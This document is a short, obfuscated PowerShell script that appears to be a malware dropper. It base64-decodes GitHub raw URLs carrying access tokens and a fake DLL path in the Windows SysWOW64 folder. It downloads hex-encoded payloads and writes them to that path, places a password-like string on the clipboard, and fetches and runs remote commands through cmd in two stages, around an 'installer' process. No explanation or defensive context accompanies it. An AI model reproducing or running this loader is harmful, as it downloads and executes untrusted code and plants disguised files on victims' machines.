$a=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
bWFpbi9pd2VfaGlzdG9yeS50eHQ/dG9rZW49R0hTQVR0QUFBQUFBQUFESTNRN081SlpRWlBTQ0FJNk1KSk9UTTJIUkFSS1E='));
$b=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
bWFpbi9lLnR4dD90b2tlbj1HSFNBVDBBQUFBQUFBQUFMU1E3TzdHNUlHUk9NT0VZV0VOWVZHMkhSQkUyQQ=='));
$c=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
bWFpbi9iLnR4dD90b2tlbj1HSFNBVDBBQUFBQUFBQUFMU1E3Tzc3NFI0V0pYTUVUVjdVUFVIRDc0hSQU5aUQ=='));
$d=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
bWFpbi9jLnR4dD90b2tlbj1HSFNBVDBBQUFBQUFBQUFMU1E3TzZENVJFWERCREtJQkJGUjZLNEhSQVpEQQ=='));
$e=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Qzpcd2luZG93c1xTeXNXT1c2NFxudGRsbHBfZGxs'));
$f=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RlRjZiMldyQWd1'));

function f1{param([string]$g)$h=[byte[]]::new($g.Length/2);for($i=0;$i-lt$g.Length;$i+=2){$h[$i/2]=[convert]::ToByte($g.Substring($i,2),16)}return $h}

$j=iwr $a; $k=$j.Content; $l=f1 $k; [IO.File]::WriteAllBytes($e,$l); Set-Clipboard $f; $m=iwr $b; $n=$m.Content; Start-Process cmd -Args "/c $n" -NoNewWindow;

while(-not(gp installer -EA 0)) {slp 1}
while(gp installer -EA 0) {slp 1}

$o=iwr $c; $p=$o.Content; $q=f1 $p; [IO.File]::WriteAllBytes($e,$q); $r=iwr $d; $s=$r.Content; Start-Process cmd -Args "/c $s" -NoNewWindow;